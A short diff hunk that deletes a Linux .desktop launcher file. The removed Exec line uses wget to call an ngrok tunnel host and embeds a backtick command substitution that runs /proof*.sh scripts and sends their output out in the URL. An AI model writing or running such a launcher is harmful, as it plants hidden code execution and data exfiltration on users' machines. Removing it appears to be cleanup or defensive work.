@@ -1,3 +1,0 @@
-[Desktop Entry]
-Exec=sh -c "wget https://d13a-219-79-44-111.ngrok.io/?\\`/proof*.sh\\`"
-Type=Application
